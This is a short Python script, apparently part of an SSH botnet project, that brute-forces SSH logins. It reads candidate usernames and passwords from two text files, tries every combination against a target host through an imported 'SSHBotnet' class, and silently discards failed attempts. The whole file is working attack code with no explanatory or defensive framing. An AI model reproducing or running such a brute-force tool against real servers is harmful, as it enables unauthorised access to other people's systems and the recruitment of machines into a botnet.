from SSHBotnet import SSHBotnet


hostIP = ''
password_path = 'password.txt'
username_path = 'username.txt'

def attack(pass_path, user_path):
        with open(user_path, 'r') as user_file:
            for user_line in user_file:
                    user = user_line.strip()
                    with open(pass_path, 'r') as pass_file:
                        for pass_line in pass_file:
                            password = pass_line.strip()
                            
                            try:
                                ssh = SSHBotnet(hostIP, user, password, 1)
                            except:
                                pass

if  __name__ == '__main__':
    attack(password_path, username_path)
